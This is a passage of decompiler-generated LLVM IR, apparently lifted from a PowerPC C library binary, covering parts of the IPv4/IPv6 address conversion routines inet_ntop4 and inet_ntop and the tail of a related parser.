  store i32 %v3_10012420, i32* %r3.global-to-local, align 4
  %v0_10012424 = load i32, i32* @r30, align 4
  store i32 %v0_10012424, i32* @r31, align 4
  %v2_10012428 = icmp sgt i32 %v3_10012420, 0
  br i1 %v2_10012428, label %dec_label_pc_1001246c, label %dec_label_pc_100124e4

dec_label_pc_10012434:                            ; preds = %dec_label_pc_10012390
  store i32 1, i32* @r23, align 4
  %v0_10012438.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012438.backedge

dec_label_pc_10012438.backedge:                   ; preds = %dec_label_pc_10012434, %dec_label_pc_100123c0
  %v0_10012438.be = phi i32 [ %v0_10012438.pre.pre, %dec_label_pc_10012434 ], [ %v0_100123c4, %dec_label_pc_100123c0 ]
  %v1_10012438 = inttoptr i32 %v0_10012438.be to i8*
  %v2_10012438 = load i8, i8* %v1_10012438, align 1
  %v3_10012438 = zext i8 %v2_10012438 to i32
  store i32 %v3_10012438, i32* %r3.global-to-local, align 4
  store i32 268510272, i32* @lr, align 4
  %v1_1001243c = call i32 @__GI_tolower(i32 %v3_10012438)
  store i32 %v1_1001243c, i32* %r3.global-to-local, align 4
  store i32 %v1_1001243c, i32* @r30, align 4
  %v3_10012440 = icmp eq i32 %v1_1001243c, 0
  br i1 %v3_10012440, label %dec_label_pc_10012448, label %dec_label_pc_10012370

dec_label_pc_10012448:                            ; preds = %dec_label_pc_10012438.backedge, %dec_label_pc_10012364, %dec_label_pc_100123e4
  %v0_10012448 = load i32, i32* @r23, align 4
  %v3_10012448 = icmp eq i32 %v0_10012448, 0
  %v0_100124b0.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10012448, label %dec_label_pc_1001246c, label %dec_label_pc_10012450

dec_label_pc_10012450:                            ; preds = %dec_label_pc_10012448
  %v1_10012450 = add i32 %v0_100124b0.pre.pre, 2
  store i32 %v1_10012450, i32* %r0.global-to-local, align 4
  %v1_10012454 = load i32, i32* @r27, align 4
  %v3_10012454 = icmp ugt i32 %v1_10012450, %v1_10012454
  br i1 %v3_10012454, label %dec_label_pc_100124e4, label %dec_label_pc_1001245c

dec_label_pc_1001245c:                            ; preds = %dec_label_pc_10012450
  %v0_1001245c = load i32, i32* @r28, align 4
  %v1_1001245c = udiv i32 %v0_1001245c, 256
  store i32 %v1_1001245c, i32* %r0.global-to-local, align 4
  %v1_10012460 = trunc i32 %v0_1001245c to i8
  %v3_10012460 = add i32 %v0_100124b0.pre.pre, 1
  %v4_10012460 = inttoptr i32 %v3_10012460 to i8*
  store i8 %v1_10012460, i8* %v4_10012460, align 1
  %v0_10012464 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012464 = trunc i32 %v0_10012464 to i8
  %v2_10012464 = load i32, i32* @r31, align 4
  %v3_10012464 = inttoptr i32 %v2_10012464 to i8*
  store i8 %v1_10012464, i8* %v3_10012464, align 1
  %v0_10012468 = load i32, i32* @r31, align 4
  %v1_10012468 = add i32 %v0_10012468, 2
  store i32 %v1_10012468, i32* @r31, align 4
  br label %dec_label_pc_1001246c

dec_label_pc_1001246c:                            ; preds = %dec_label_pc_10012448, %dec_label_pc_10012418, %dec_label_pc_1001245c
  %v0_100124b0.pre = phi i32 [ %v0_10012424, %dec_label_pc_10012418 ], [ %v1_10012468, %dec_label_pc_1001245c ], [ %v0_100124b0.pre.pre, %dec_label_pc_10012448 ]
  %v0_1001246c = load i32, i32* @r24, align 4
  %v3_1001246c = icmp eq i32 %v0_1001246c, 0
  %v1_100124b0.pre = load i32, i32* @r27, align 4
  %v4_100124b0 = icmp eq i32 %v0_100124b0.pre, %v1_100124b0.pre
  br i1 %v3_1001246c, label %dec_label_pc_100124b0, label %dec_label_pc_10012474

dec_label_pc_10012474:                            ; preds = %dec_label_pc_1001246c
  %v2_10012478 = sub i32 %v0_100124b0.pre, %v0_1001246c
  store i32 %v2_10012478, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_100124b0, label %dec_label_pc_100124e4, label %dec_label_pc_10012498.preheader

dec_label_pc_10012498.preheader:                  ; preds = %dec_label_pc_10012474
  %v3_1001249824 = icmp slt i32 %v2_10012478, 1
  %v2_1001249c26 = add i32 %v2_10012478, -1
  store i32 %v2_1001249c26, i32* %r10.global-to-local, align 4
  %v2_100124a027 = add i32 %v1_100124b0.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1001249824, label %dec_label_pc_100124b0.thread, label %dec_label_pc_1001248c

dec_label_pc_1001248c:                            ; preds = %dec_label_pc_10012498.preheader, %dec_label_pc_1001248c.dec_label_pc_1001248c_crit_edge
  %v0_1001248c = phi i32 [ %v0_1001248c.pre, %dec_label_pc_1001248c.dec_label_pc_1001248c_crit_edge ], [ %v0_1001246c, %dec_label_pc_10012498.preheader ]
  %v2_100124a029 = phi i32 [ %v2_100124a0, %dec_label_pc_1001248c.dec_label_pc_1001248c_crit_edge ], [ %v2_100124a027, %dec_label_pc_10012498.preheader ]
  %v2_1001249c28 = phi i32 [ %v2_1001249c, %dec_label_pc_1001248c.dec_label_pc_1001248c_crit_edge ], [ %v2_1001249c26, %dec_label_pc_10012498.preheader ]
  %v2_1001248c = add i32 %v0_1001248c, %v2_1001249c28
  %v3_1001248c = inttoptr i32 %v2_1001248c to i8*
  %v4_1001248c = load i8, i8* %v3_1001248c, align 1
  %v5_1001248c = zext i8 %v4_1001248c to i32
  store i32 %v5_1001248c, i32* %r0.global-to-local, align 4
  %v3_10012490 = inttoptr i32 %v2_100124a029 to i8*
  store i8 %v4_1001248c, i8* %v3_10012490, align 1
  %v0_10012494 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012494 = load i32, i32* @r24, align 4
  %v2_10012494 = load i32, i32* %r10.global-to-local, align 4
  %v3_10012494 = trunc i32 %v0_10012494 to i8
  %v4_10012494 = add i32 %v2_10012494, %v1_10012494
  %v5_10012494 = inttoptr i32 %v4_10012494 to i8*
  store i8 %v3_10012494, i8* %v5_10012494, align 1
  %v0_10012498.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10012498.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_100124a0.pre = load i32, i32* @r27, align 4
  %v3_10012498 = icmp slt i32 %v1_10012498.pre, %v0_10012498.pre
  %v2_1001249c = sub i32 %v1_10012498.pre, %v0_10012498.pre
  store i32 %v2_1001249c, i32* %r10.global-to-local, align 4
  %v1_100124a4 = add i32 %v0_10012498.pre, 1
  store i32 %v1_100124a4, i32* %r9.global-to-local, align 4
  br i1 %v3_10012498, label %dec_label_pc_100124b0.thread, label %dec_label_pc_1001248c.dec_label_pc_1001248c_crit_edge

dec_label_pc_1001248c.dec_label_pc_1001248c_crit_edge: ; preds = %dec_label_pc_1001248c
  %v2_100124a0 = sub i32 %v1_100124a0.pre, %v0_10012498.pre
  %v0_1001248c.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1001248c

dec_label_pc_100124b0.thread:                     ; preds = %dec_label_pc_1001248c, %dec_label_pc_10012498.preheader
  %v0_100124ac.lcssa = phi i32 [ %v1_100124b0.pre, %dec_label_pc_10012498.preheader ], [ %v1_100124a0.pre, %dec_label_pc_1001248c ]
  store i32 %v0_100124ac.lcssa, i32* @r31, align 4
  br label %dec_label_pc_100124b8

dec_label_pc_100124b0:                            ; preds = %dec_label_pc_1001246c
  br i1 %v4_100124b0, label %dec_label_pc_100124b8, label %dec_label_pc_100124e4

dec_label_pc_100124b8:                            ; preds = %dec_label_pc_100124b0.thread, %dec_label_pc_100124b0
  %v0_100124b8 = load i32, i32* @r22, align 4
  store i32 %v0_100124b8, i32* @r3, align 4
  store i32 %v2_10012334, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100124c8.953 to i32), i32* @lr, align 4
  %v0_100124c4 = call i32 @memcpy()
  store i32 %v0_100124c4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100124e8

dec_label_pc_100124d0:                            ; preds = %dec_label_pc_10012314
  %v0_100124d0 = call i32 @__errno_location()
  store i32 %v0_100124d0, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100124dc = inttoptr i32 %v0_100124d0 to i32*
  store i32 97, i32* %v2_100124dc, align 4
  %v0_100124ec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100124e8

dec_label_pc_100124e4:                            ; preds = %dec_label_pc_100123d8, %dec_label_pc_100123cc, %dec_label_pc_10012390, %dec_label_pc_100123b8, %dec_label_pc_10012474, %dec_label_pc_10012418, %dec_label_pc_10012404, %dec_label_pc_100124b0, %dec_label_pc_10012358, %dec_label_pc_10012450, %dec_label_pc_1001240c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100124e8

dec_label_pc_100124e8:                            ; preds = %dec_label_pc_100124d0, %dec_label_pc_100124b8, %dec_label_pc_10012320, %dec_label_pc_100124e4
  %v0_100124ec = phi i32 [ %v0_100124ec.pre, %dec_label_pc_100124d0 ], [ 1, %dec_label_pc_100124b8 ], [ %v3_10012328, %dec_label_pc_10012320 ], [ 0, %dec_label_pc_100124e4 ]
  store i32 %v0_100122f8, i32* %r0.global-to-local, align 4
  store i32 %v0_100124ec, i32* %r3.global-to-local, align 4
  ret i32 %v0_100124ec

; uselistorder directives
  uselistorder i32 %v0_100124ec, { 1, 0 }
  uselistorder i32 %v2_1001249c, { 1, 0 }
  uselistorder i32 %v0_10012498.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_100124b0, { 1, 0 }
  uselistorder i32 %v0_100124b0.pre, { 1, 0 }
  uselistorder i32 %v0_1001245c, { 1, 0 }
  uselistorder i32 %v0_100124b0.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1001243c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_100123e4, { 1, 0 }
  uselistorder i32 %v1_10012394, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268510272, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_100124e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100124e4, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_100124b8, { 1, 0 }
  uselistorder label %dec_label_pc_1001248c, { 1, 0 }
  uselistorder label %dec_label_pc_1001246c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012448, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012370.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10012370, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10012558.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10012500 = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1001252c = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1001252c, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1001253c.956 to i32), i32* @lr, align 4
  %v3_10012538 = call i32 @__GI_memset(i32 %v2_1001252c, i32 0, i32 15)
  store i32 %v3_10012538, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_100125fc2 = load i32, i32* @r1, align 4
  store i32 %v0_100125fc2, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012558

dec_label_pc_10012558:                            ; preds = %dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge, %dec_label_pc_10012558.lr.ph
  %v2_10012578 = phi i32 [ %v2_100125fc, %dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge ], [ %v0_100125fc2, %dec_label_pc_10012558.lr.ph ]
  %v0_1001256c = phi i32 [ %v0_100125fc, %dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge ], [ %v0_100125fc2, %dec_label_pc_10012558.lr.ph ]
  %v0_1001255c = phi i32 [ %v1_100125fc, %dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge ], [ 0, %dec_label_pc_10012558.lr.ph ]
  %v1_10012564 = phi i32 [ %v1_10012558.pre, %dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge ], [ 0, %dec_label_pc_10012558.lr.ph ]
  %v0_10012558 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012558 = add i32 %v0_10012558, %v1_10012564
  %v3_10012558 = inttoptr i32 %v2_10012558 to i8*
  %v4_10012558 = load i8, i8* %v3_10012558, align 1
  %v5_10012558 = zext i8 %v4_10012558 to i32
  store i32 %v5_10012558, i32* %r10.global-to-local, align 4
  store i32 %v0_1001255c, i32* %r8.global-to-local, align 4
  %v1_10012560 = add i32 %v0_1001255c, 1
  store i32 %v1_10012560, i32* %r11.global-to-local, align 4
  store i32 %v2_10012558, i32* %r3.global-to-local, align 4
  %v1_10012568 = load i32, i32* @r28, align 4
  %v2_10012568 = udiv i32 %v5_10012558, %v1_10012568
  %v2_1001256c = add i32 %v1_10012560, %v0_1001256c
  store i32 %v2_1001256c, i32* %r6.global-to-local, align 4
  %v1_10012570 = add nuw nsw i32 %v2_10012568, 48
  %v1_10012574 = urem i32 %v1_10012570, 256
  store i32 %v1_10012574, i32* %r0.global-to-local, align 4
  %v1_10012578 = trunc i32 %v1_10012570 to i8
  %v3_10012578 = add i32 %v2_10012578, 8
  %v4_10012578 = inttoptr i32 %v3_10012578 to i8*
  store i8 %v1_10012578, i8* %v4_10012578, align 1
  %v0_1001257c = load i32, i32* %r0.global-to-local, align 4
  %v3_1001257c = icmp eq i32 %v0_1001257c, 48
  %v0_10012584 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012584 = load i32, i32* %r5.global-to-local, align 4
  %v2_10012584 = udiv i32 %v0_10012584, %v1_10012584
  store i32 %v2_10012584, i32* %r9.global-to-local, align 4
  br i1 %v3_1001257c, label %dec_label_pc_10012584, label %dec_label_pc_100125b0

dec_label_pc_10012584:                            ; preds = %dec_label_pc_10012558
  %v2_10012588 = udiv i32 %v2_10012584, %v1_10012584
  %tmp18 = mul i32 %v2_10012588, -10
  %v2_10012590 = add i32 %v2_10012584, 48
  %v1_10012594 = add i32 %v2_10012590, %tmp18
  store i32 %v1_10012594, i32* %r9.global-to-local, align 4
  %v1_10012598 = urem i32 %v1_10012594, 256
  store i32 %v1_10012598, i32* %r0.global-to-local, align 4
  %v1_1001259c = trunc i32 %v1_10012594 to i8
  %v2_1001259c = load i32, i32* %r7.global-to-local, align 4
  %v3_1001259c = add i32 %v2_1001259c, 8
  %v4_1001259c = inttoptr i32 %v3_1001259c to i8*
  store i8 %v1_1001259c, i8* %v4_1001259c, align 1
  %v0_100125a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_100125a0 = icmp eq i32 %v0_100125a0, 48
  br i1 %v3_100125a0, label %dec_label_pc_100125cc, label %dec_label_pc_100125a8

dec_label_pc_100125a8:                            ; preds = %dec_label_pc_10012584
  %v0_100125a8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100125a8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100125cc

dec_label_pc_100125b0:                            ; preds = %dec_label_pc_10012558
  %v0_100125b4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100125b4 = add i32 %v0_100125b4, 1
  store i32 %v1_100125b4, i32* %r8.global-to-local, align 4
  %v2_100125b8 = udiv i32 %v2_10012584, %v1_10012584
  %v1_100125bc = mul i32 %v2_100125b8, 10
  store i32 %v1_100125bc, i32* %r0.global-to-local, align 4
  %v2_100125c0 = sub i32 %v2_10012584, %v1_100125bc
  %v1_100125c4 = add i32 %v2_100125c0, 48
  store i32 %v1_100125c4, i32* %r9.global-to-local, align 4
  %v1_100125c8 = trunc i32 %v1_100125c4 to i8
  %v2_100125c8 = load i32, i32* %r6.global-to-local, align 4
  %v3_100125c8 = add i32 %v2_100125c8, 8
  %v4_100125c8 = inttoptr i32 %v3_100125c8 to i8*
  store i8 %v1_100125c8, i8* %v4_100125c8, align 1
  br label %dec_label_pc_100125cc

dec_label_pc_100125cc:                            ; preds = %dec_label_pc_10012584, %dec_label_pc_100125a8, %dec_label_pc_100125b0
  %v0_100125cc = load i32, i32* %r3.global-to-local, align 4
  %v1_100125cc = inttoptr i32 %v0_100125cc to i8*
  %v2_100125cc = load i8, i8* %v1_100125cc, align 1
  %v3_100125cc = zext i8 %v2_100125cc to i32
  %v0_100125d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100125d0 = add i32 %v0_100125d0, 1
  %v0_100125d4 = load i32, i32* @r1, align 4
  %v2_100125d4 = add i32 %v0_100125d4, %v0_100125d0
  store i32 %v2_100125d4, i32* %r10.global-to-local, align 4
  %v2_100125d8 = add i32 %v1_100125d0, %v0_100125d4
  store i32 %v2_100125d8, i32* %r8.global-to-local, align 4
  %v1_100125dc = load i32, i32* %r5.global-to-local, align 4
  %v2_100125dc = udiv i32 %v3_100125cc, %v1_100125dc
  %v1_100125e0 = add i32 %v0_100125d0, 2
  store i32 %v1_100125e0, i32* %r11.global-to-local, align 4
  %v0_100125e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100125e4 = add i32 %v0_100125e4, 1
  store i32 %v1_100125e4, i32* %r4.global-to-local, align 4
  %v1_100125e8 = mul nuw nsw i32 %v2_100125dc, 10
  store i32 %v1_100125e8, i32* %r0.global-to-local, align 4
  %v2_100125ec = sub nsw i32 %v3_100125cc, %v1_100125e8
  %v1_100125f0 = add nsw i32 %v2_100125ec, 48
  store i32 %v1_100125f0, i32* %r9.global-to-local, align 4
  %v1_100125f4 = trunc i32 %v1_100125f0 to i8
  %v3_100125f4 = add i32 %v2_100125d4, 8
  %v4_100125f4 = inttoptr i32 %v3_100125f4 to i8*
  store i8 %v1_100125f4, i8* %v4_100125f4, align 1
  %v0_100125f8 = load i32, i32* %r12.global-to-local, align 4
  %v1_100125f8 = trunc i32 %v0_100125f8 to i8
  %v2_100125f8 = load i32, i32* %r8.global-to-local, align 4
  %v3_100125f8 = add i32 %v2_100125f8, 8
  %v4_100125f8 = inttoptr i32 %v3_100125f8 to i8*
  store i8 %v1_100125f8, i8* %v4_100125f8, align 1
  %v0_100125fc = load i32, i32* @r1, align 4
  %v1_100125fc = load i32, i32* %r11.global-to-local, align 4
  %v2_100125fc = add i32 %v1_100125fc, %v0_100125fc
  store i32 %v2_100125fc, i32* %r7.global-to-local, align 4
  %v0_10012600 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012600 = add i32 %v0_10012600, -1
  store i32 %v1_10012600, i32* %ctr.global-to-local, align 4
  %v2_10012600 = icmp eq i32 %v1_10012600, 0
  br i1 %v2_10012600, label %dec_label_pc_10012604, label %dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge

dec_label_pc_100125cc.dec_label_pc_10012558_crit_edge: ; preds = %dec_label_pc_100125cc
  %v1_10012558.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012558

dec_label_pc_10012604:                            ; preds = %dec_label_pc_100125cc
  %v2_10012604 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10012604, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001260c = add i32 %v1_100125fc, %v2_10012604
  store i32 %v2_1001260c, i32* %r9.global-to-local, align 4
  store i32 %v2_10012604, i32* @r3, align 4
  %v3_10012614 = add i32 %v2_1001260c, -1
  %v4_10012614 = inttoptr i32 %v3_10012614 to i8*
  store i8 0, i8* %v4_10012614, align 1
  %v0_10012618 = call i32 @__GI_strlen()
  store i32 %v0_10012618, i32* %r3.global-to-local, align 4
  %v1_1001261c = load i32, i32* @r30, align 4
  %v3_1001261c = icmp ugt i32 %v0_10012618, %v1_1001261c
  br i1 %v3_1001261c, label %dec_label_pc_10012624, label %dec_label_pc_10012638

dec_label_pc_10012624:                            ; preds = %dec_label_pc_10012604
  %v0_10012624 = call i32 @__errno_location()
  store i32 %v0_10012624, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10012630 = inttoptr i32 %v0_10012624 to i32*
  store i32 28, i32* %v2_10012630, align 4
  %v0_1001264c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012648

dec_label_pc_10012638:                            ; preds = %dec_label_pc_10012604
  %v0_10012638 = load i32, i32* @r29, align 4
  store i32 %v0_10012638, i32* %r3.global-to-local, align 4
  store i32 %v2_10012604, i32* %r4.global-to-local, align 4
  %v2_10012640 = bitcast i16* %stack_var_-56 to i8*
  %v3_10012640 = call i32 @strcpy(i32 %v0_10012638, i8* %v2_10012640)
  store i32 %v3_10012640, i32* %r3.global-to-local, align 4
  store i32 %v3_10012640, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012648

dec_label_pc_10012648:                            ; preds = %dec_label_pc_10012624, %dec_label_pc_10012638
  %v0_1001264c = phi i32 [ %v0_1001264c.pre, %dec_label_pc_10012624 ], [ %v3_10012640, %dec_label_pc_10012638 ]
  store i32 %v0_10012500, i32* %r0.global-to-local, align 4
  store i32 %v0_1001264c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001264c

; uselistorder directives
  uselistorder i32 %v0_1001264c, { 1, 0 }
  uselistorder i32 %v2_10012604, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10012600, { 1, 0 }
  uselistorder i32 %v2_100125fc, { 1, 0 }
  uselistorder i32 %v0_100125d0, { 1, 0, 2 }
  uselistorder i32 %v1_10012594, { 1, 0, 2 }
  uselistorder i32 %v2_10012584, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10012570, { 1, 0 }
  uselistorder i32 %v0_1001255c, { 1, 0 }
  uselistorder i32 %v0_100125fc2, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 15, { 0, 3, 1, 8, 9, 4, 5, 6, 2, 7 }
  uselistorder i32 268566528, { 25, 30, 27, 26, 0, 28, 29, 5, 6, 7, 8, 9, 10, 4, 11, 2, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 3 }
  uselistorder label %dec_label_pc_10012648, { 1, 0 }
  uselistorder label %dec_label_pc_100125cc, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_10012660 = icmp slt i32 %arg1, 2
  %v3_10012660 = icmp eq i32 %arg1, 2
  store i1 %v1_10012660, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012660, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_10012660, label %dec_label_pc_10012690, label %dec_label_pc_10012684

dec_label_pc_10012684:                            ; preds = %entry
  %v1_10012684 = icmp slt i32 %arg1, 10
  %v3_10012684 = icmp eq i32 %arg1, 10
  store i1 %v1_10012684, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012684, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012684, label %dec_label_pc_100126c8.lr.ph, label %dec_label_pc_100128dc

dec_label_pc_10012690:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_100126a0.958 to i32), i32* @lr, align 4
  %v3_1001269c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_100128d4

dec_label_pc_100126c8.lr.ph:                      ; preds = %dec_label_pc_10012684
  %v2_100126a4 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_100126a4, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100126b8.959 to i32), i32* @lr, align 4
  %v3_100126b4 = call i32 @__GI_memset(i32 %v2_100126a4, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_100126e815 = load i32, i32* @r27, align 4
  store i32 %v0_100126e815, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100126c8

dec_label_pc_100126c8:                            ; preds = %dec_label_pc_100126c8.lr.ph, %dec_label_pc_100126c8
  %v1_100126dc = phi i32 [ 0, %dec_label_pc_100126c8.lr.ph ], [ %v1_100126ec, %dec_label_pc_100126c8 ]
  %v0_100126c8 = phi i32 [ %v0_100126e815, %dec_label_pc_100126c8.lr.ph ], [ %v0_100126e8, %dec_label_pc_100126c8 ]
  %v0_100126d0 = phi i32 [ %v0_100126e815, %dec_label_pc_100126c8.lr.ph ], [ %v2_100126e8, %dec_label_pc_100126c8 ]
  %v1_100126c8 = phi i32 [ 0, %dec_label_pc_100126c8.lr.ph ], [ %v0_100126e0, %dec_label_pc_100126c8 ]
  %v2_100126c8 = add i32 %v0_100126c8, %v1_100126c8
  %v3_100126c8 = inttoptr i32 %v2_100126c8 to i8*
  %v4_100126c8 = load i8, i8* %v3_100126c8, align 1
  %v5_100126c8 = zext i8 %v4_100126c8 to i32
  %v1_100126cc = add i32 %v1_100126c8, 2
  store i32 %v1_100126cc, i32* %r11.global-to-local, align 4
  %v1_100126d0 = add i32 %v0_100126d0, 1
  %v2_100126d0 = inttoptr i32 %v1_100126d0 to i8*
  %v3_100126d0 = load i8, i8* %v2_100126d0, align 1
  %v4_100126d0 = zext i8 %v3_100126d0 to i32
  %v1_100126d4 = mul nuw nsw i32 %v5_100126c8, 256
  %v2_100126d8 = or i32 %v4_100126d0, %v1_100126d4
  %v2_100126dc = load i32, i32* %r29.global-to-local, align 4
  %v3_100126dc = add i32 %v2_100126dc, %v1_100126dc
  %v4_100126dc = inttoptr i32 %v3_100126dc to i32*
  store i32 %v2_100126d8, i32* %v4_100126dc, align 4
  %v0_100126e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100126e0 = udiv i32 %v0_100126e0, 2
  %v0_100126e8 = load i32, i32* @r27, align 4
  %v2_100126e8 = add i32 %v0_100126e8, %v0_100126e0
  store i32 %v2_100126e8, i32* %r9.global-to-local, align 4
  %v1_100126ec = mul i32 %v1_100126e0, 4
  %v0_100126f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100126f0 = add i32 %v0_100126f0, -1
  store i32 %v1_100126f0, i32* %ctr.global-to-local, align 4
  %v2_100126f0 = icmp eq i32 %v1_100126f0, 0
  br i1 %v2_100126f0, label %dec_label_pc_10012710.lr.ph, label %dec_label_pc_100126c8

dec_label_pc_10012710.lr.ph:                      ; preds = %dec_label_pc_100126c8
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012710

